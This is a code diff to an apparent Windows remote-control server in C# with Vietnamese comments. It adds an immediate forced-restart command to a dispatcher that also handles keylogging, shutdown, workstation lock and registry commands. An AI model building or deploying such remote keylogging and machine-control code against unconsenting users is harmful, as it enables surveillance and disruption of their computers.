@@ -65,6 +65,12 @@ namespace server
             System.Diagnostics.Process.Start("ShutDown", "-s");
         }
 
+        public void restart()
+        {
+            // Tham số -r là Restart, -t 0 là thực hiện ngay lập tức (0 giây)
+            System.Diagnostics.Process.Start("ShutDown", "-r -t 0");
+        }
+
         // 1. Nhập thư viện hệ thống để gọi lệnh khóa màn hình
         [DllImport("user32.dll")]
         public static extern bool LockWorkStation();
@@ -1076,7 +1082,7 @@ namespace server
                         {
                             case "KEYLOG": keylog(); break;
                             case "SHUTDOWN": shutdown(); break;
-
+                            case "RESTART": restart(); break;
                             case "LOCK": lockSystem(); break;
                             
                             case "REGISTRY": registry(); break;
